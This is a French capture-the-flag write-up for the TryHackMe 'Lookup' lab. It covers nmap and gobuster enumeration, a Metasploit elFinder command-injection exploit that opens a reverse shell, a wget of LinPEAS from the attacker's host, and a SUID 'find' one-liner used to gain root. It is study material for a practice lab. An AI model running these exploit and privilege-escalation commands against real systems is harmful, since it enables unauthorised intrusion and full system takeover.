# 📌 Write-Up : Machine Lookup - TryHackMe

## 🖥️ Informations Générales
- **Nom de la machine** : Lookup
- **Difficulté** : Facile
- **Adresse IP** : *(variable selon l'instance TryHackMe)*
- **Outils utilisés** : `nmap`, `gobuster`, `metasploit`, `Linpeas`
- **Objectif** : Obtenir un accès user et root et récupérer les flags

> 
## 🔍 Introduction
Ce write-up détaillé de la machine **Lookup** sur **TryHackMe** explique comment exploiter **elFinder PHP** pour obtenir un shell et escalader les privilèges jusqu'à `root`.

Voici les outils necessaires: nmap, gobuster, burpsuite, metasploit, linpeas
---

## **🖥️ 1. Reconnaissance**  
### 🔍 **1️⃣ Scan Nmap**
On commence par scanner la machine avec **Nmap** pour voir les ports ouverts :  
```bash
nmap -sC -sV -oN scan.txt 10.10.16.70
```
🔹 **Explication** :  
- `-sC` : Lance des scripts de détection par défaut.  
- `-sV` : Identifie les versions des services.  
- `-oN scan.txt` : Sauvegarde les résultats dans un fichier.

**Résultat :**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 (Ubuntu)
80/tcp   open  http     Apache httpd 2.4.29
```
👉 On remarque que **SSH (22)** et **HTTP (80)** sont ouverts.  

---

## **🌐 2. Enumeration Web**  
### 🔹 **Accès au site web**
On ouvre **http://lookup.thm/** dans le navigateur.  
Le site affiche une page basique sans information importante.

### 🔹 **Fuzzing des sous-domaines avec Gobuster**
On va chercher des **sous-domaines cachés** avec **Gobuster** :
```bash
gobuster vhost -u http://lookup.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```
**Résultat :**
```
Found: files.lookup.thm (Status: 200)
```
👉 Un sous-domaine **files.lookup.thm** existe !  

### 🔹 **Ajout dans `/etc/hosts`**
On ajoute ce sous-domaine pour pouvoir y accéder :
```bash
sudo nano /etc/hosts
```
Ajoute cette ligne :
```
10.10.16.70  lookup.thm files.lookup.thm
```

### 🔹 **Accès à `files.lookup.thm`**
En visitant **http://files.lookup.thm/**, on voit une **interface de gestion de fichiers** (elFinder).  
👉 **elFinder est connu pour avoir des vulnérabilités !**

---

## **🚀 3. Exploitation - Command Injection**
### 🔹 **Recherche d'une Exploitation Possible**
On cherche sur Google :  
**"elFinder PHP Connector exploit"**  
➡️ On trouve que la version de **elFinder** utilisée ici est vulnérable à une **command injection** via `exiftran`.

### 🔹 **Exploitation avec Metasploit**
On utilise **Metasploit** pour automatiser l'exploitation :
```bash
msfconsole
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS 10.10.16.70 (VPN tryhackme)
set TARGETURI /php/connector.php
set LHOST Ici Ton IP Tun0 (VPN)
set LPORT 4444
run
```
💥 **Shell obtenu !**  (n'oubliez pas de l'activer si vous êtes sur meterpreter, en tapant: shell)
```
meterpreter > whoami
www-data
```
👉 On a un shell avec l’utilisateur **www-data**.

---

## **🛠️ 4. Escalade de Privilèges**
On veut passer de **www-data** à **root**.  
On lance **LinPEAS** pour détecter des failles :
```bash
wget http://10.11.125.223:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
🔹 **LinPEAS détecte un fichier SUID suspect :**
```
/usr/bin/find has SUID bit set
```
On regarde dans **GTFOBins** si `find` peut être exploité pour devenir root :
```bash
find . -exec /bin/sh -p \; -quit
```
💥 **Root obtenu !**
```bash
whoami
root
```

---

## **🏆 5. Capture du Flag**
On récupère les flags :  

🔹 **User flag** :
```bash
cat /home/user/user.txt
```
🔹 **Root flag** :
```bash
cat /root/root.txt
```

---

## **🎯 Conclusion**
✅ **Méthodologie utilisée :**
1. **Nmap** → Ports ouverts.
2. **Gobuster** → Trouver un sous-domaine caché.
3. **Exploit elFinder** → Command Injection avec Metasploit.
4. **LinPEAS** → Trouver un binaire SUID exploitable.
5. **GTFOBins** → Élever les privilèges et devenir root.

💡 **Leçon apprise :**
- **Ne jamais ignorer les sous-domaines** !
- **Toujours tester les applications web pour des exploits connus.**
- **LinPEAS + GTFOBins = Escalade de privilèges efficace !**

---

